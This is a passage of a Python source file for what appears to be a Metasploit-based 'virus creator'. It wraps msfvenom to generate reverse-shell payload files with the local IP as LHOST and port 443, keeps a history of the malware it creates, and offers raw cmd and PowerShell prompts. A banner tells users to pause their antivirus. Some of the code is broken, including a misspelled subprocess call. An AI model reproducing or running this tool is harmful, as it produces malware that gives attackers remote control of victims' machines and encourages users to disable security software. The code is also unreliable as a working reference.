                                cprint("Please be patient a 2 more components to load", "red")
                                writeFileinBase64(formatFile, form)
                                formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
                            formatPayload = input("please type your format>>")
                            if formatPayload in formatList:
                                name = input("name of the file you need to name your virus>>")
                                os.system(
                                    f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={socket.gethostbyname(socket.gethostname())} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                                mainPath = os.path.join(pathData, "metasploit-framework/bin")
                                mixPath = os.path.join(mainPath, name)
                                makedirandmovefile(mixPath, platformPayload, formatPayload, name)
                            else:
                                cprint("Invalid format please type lsf to list all formats", "red", None,
                                       attrs=["bold"])
        else:
            if platformPayload != "swd" and platformPayload != "check-updates" and platformPayload != "cu" and platformPayload != "eth" and platformPayload != "show-history" and platformPayload != "clear-history" and platformPayload != "eth" and platformPayload != "export-the-histories" and platformPayload != "r-cvc" and platformPayload != "risl-vc" and platformPayload != "r-rvc" and platformPayload != "ec" and platformPayload != "ecd" and platformPayload != "enter-cmd" and platformPayload != "rvc" and platformPayload != "enter-ps1" and platformPayload != "help" and platformPayload != "remove-virus-creator" and platformPayload != "clear-data" and platformPayload != "lsp" and platformPayload != "lsf" and platformPayload != "show-ip" and platformPayload != "r-rvc" and platformPayload != "sip" and platformPayload != "" and platformPayload != " " and "A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z".lower() not in platformPayload and len(
                    platformPayload.strip()) != 10:
                cprint("Unknown command or payload please type lsp to list all payloads", "red", None, attrs=["bold"])


def cmd():
    cprint("Type 'exit-cmd' command to exit", "green", None, attrs=["bold"])
    bash = input(">> ")
    if bash != "exit-cmd":
        output = subprodup.check_output(bash, shell=True)
        if ": not found" in output.decode("utf-8"):
            print("Invalid Command")
        else:
            print(output.decode("utf-8"))
        if bash != "exit-cmd":
            bash = input(">> ")
            while bash != "exit-cmd":
                bash = input(">>")
                output = subprodup.check_output(bash, shell=True)
                if ": not found" in output.decode("utf-8"):
                    print("Invalid Command")
                elif bash != "exit-cmd":
                    print(output.decode("utf-8"))


def makedirandmovefile(nameofFile, selectedPayload, formatType, nameOnlyOffile):
    mainPath = ""
    mainName = ""
    cprint("""
        Where do you want to move the file to existing folder or create new folder

        1) I want to move to a existing folder
        2) I want to create a new folder and move the file

        """, "green", attrs=["bold"])
    confirmToExistingOrNew = input("number>> ")
    if confirmToExistingOrNew == "2":
        cprint(
            "Type the path you need to move the file first type the drive you need to create the folder and press ENTER then type the folder name you need to create",
            "green", attrs=["bold"])
        path = input("path>> ")
        nameoffolder = input("folder-name>> ")
        os.mkdir(os.path.join(path, nameoffolder))
        createdPath = path + "/" + nameoffolder
        mainPath = createdPath
        nameofFileMixed = nameofFile + "." + formatType
        mainName = nameofFileMixed
        os.system(f"cd/&&move {nameofFileMixed} {createdPath}")
    elif confirmToExistingOrNew == "1":
        existingPath = input("path>> ")
        mainPath = existingPath
        nameofFileMixed = nameofFile + "." + formatType
        mainName = nameofFileMixed
        os.system(f"cd/&&move {nameofFileMixed} {existingPath}")
    else:
        cprint("Invalid Command", "red", attrs=["bold"])
        while confirmToExistingOrNew != "1" and confirmToExistingOrNew != "2":
            cprint("""
                Where do you want to move the file to existing folder or create new folder

                1) I want to move to a existing folder
                2) I want to create a new folder and move the file

                """, "green", attrs=["bold"])
            confirmToExistingOrNew = input("number>>")
            if confirmToExistingOrNew == "2":
                cprint(
                    "Type the path you need to move the file first type the path and press ENTER then type the folder name you need to create",
                    "green", attrs=["bold"])
                path = input("path>> ")
                nameoffolder = input("folder-name>> ")
                os.mkdir(path)
                createdPath = path + "/" + nameoffolder
                nameofFileMixed = nameofFile + "." + formatType
                mainName = nameofFileMixed
                os.system(f"cd/&&move {nameofFileMixed} {createdPath}")
            elif confirmToExistingOrNew == "1":
                existingPath = input("path>> ")
                nameofFileMixed = nameofFile + "." + formatType
                mainName = nameofFileMixed
                os.system(f"cd/&&move {nameofFileMixed} {existingPath}")
            else:
                cprint("Invalid Command", "red", attrs=["bold"])
    data = f"""
File-Name = {nameOnlyOffile}.{formatType}
Payload = {selectedPayload}
File extension/file format = .{formatType} 
Path = {mainPath}
Created Date = date:{datetime.datetime.today().date()}
Created Time = hour:{datetime.datetime.today().hour} minute:{datetime.datetime.today().minute} second:{datetime.datetime.today().second}
           """
    if os.path.exists(historyFile):
        histories = open(historyFile).read()
        open(historyFile, "w").write(f"""
        {histories}


        {data}
        """)
    else:
        open(historyFile, "w").write(f"""
        {data}
        """)


def installMetasploit():
    metasInTOF = input("Doo you have metasploit installed in your computer? [Y/N]")
    if metasInTOF.lower() == "n":
        if os.path.exists(f"c:/Users/{os.getlogin()}/Downloads/metasploitframework-latest.msi"):
            runps(f'& "c:/Users/{os.getlogin()}/Downloads/metasploitframework-latest.msi"')
        else:
            if os.path.exists(f"d:/metasploitframework-latest.msi"):
                runps(f'& "d:/metasploitframework-latest.msi"')
            runps("")
            runps(f"c:/Users/{os.getlogin()}/Downloads/metasploitframework-latest.msi")
    else:
        pathto = input("please type the path you installed>> ")
        if os.path.exists(pathto):
            os.system(f"cd {pathto}")


def ps1():
    cprint("Type 'exit-ps1' command to exit", "green", None, attrs=["bold"])
    ps = input(">> ")
    if ps != "exit-ps1":
        subprocess.run(["powershell", "-Command", ps])
        if ps != "exit-ps1":
            ps = input(">> ")
            while ps != "exit-ps1":
                ps = input(">> ")
                subprocess.run(["powershell", "-Command", ps])


import ctypes, os


def isAdmin():
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin


def unzip(pathToFile, destinationPath):
    with zipfile.ZipFile(pathToFile, 'r') as zip_ref:
        zip_ref.extractall(destinationPath)


def unrar(pathtoFile, dest):
    patoolib.extract_archive(pathtoFile, outdir=dest)


def prntLicense():
    cprint(""" 
                          License Agreement of this Program
                         ====================================
                               Created by AbdulWahab
                               *********************
                                  With Metasploit

                          This app is created with metasploit
        =========================================================================
                            License Agreement Of metasploit
                          ==================================
                          Copyright (C) 2006-2015, Rapid7, Inc.

                    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND
                    CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
                    INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
                    MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
                    DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
                    CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
                    INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
                    (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
                    GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR
                    BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
                    LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
                    (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
                    OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
                    POSSIBILITY OF SUCH DAMAGE.

                    ========================================================

                    The Metasploit Framework is provided under the 3-clause
                    BSD license above.

                    The copyright on this package is held by Rapid7, Inc.

                    This license does not apply to several components within
                    the Metasploit Framework source tree.  For more details
                    see the LICENSE file at
                    https://github.com/rapid7/metasploit-       
            """, "cyan", attrs=["bold"])


def prntImportantText():
    cprint("""              
                                   ********************************************************************************************
                                   *                    ***PLEASE READ THIS IT IS IMPORTANT***                                *
                                   *                                                                                          *
                                   *                       PLEASE PAUSE YOUR ANTIVIRUS                                        *  
                                   *                     =================================                                    *
                                   *   Your antivirus maybe detecting alot viruses BUT I PROMISE YOU THIS IS NOT VIRUS        *  
                                   *  BUT IT ALLOWS YOU TO CREATE VIRUS THIS APP CONTAINS VIRUSES WON'T HARM YOU...           *
                                   *      BUT AFTER YOU MADE THE VIRUS THEN IF YOU RUN THAT EXECUTABLE FILE IT WILL HARM YOU  *
                                   *              ********************************************                                * 
                                   *           SO DON'T RUN THE RESULTED FILE OR THE MALWARE YOU MADE                         * 
                                   *         ON YOUR COMPUTER WHICH CAN CAUSE TO SECURITY VULNERABILITIES                     *
                                   ********************************************************************************************
                                  """, "cyan", attrs=["bold"])


def start():
    while True:
        showInput()
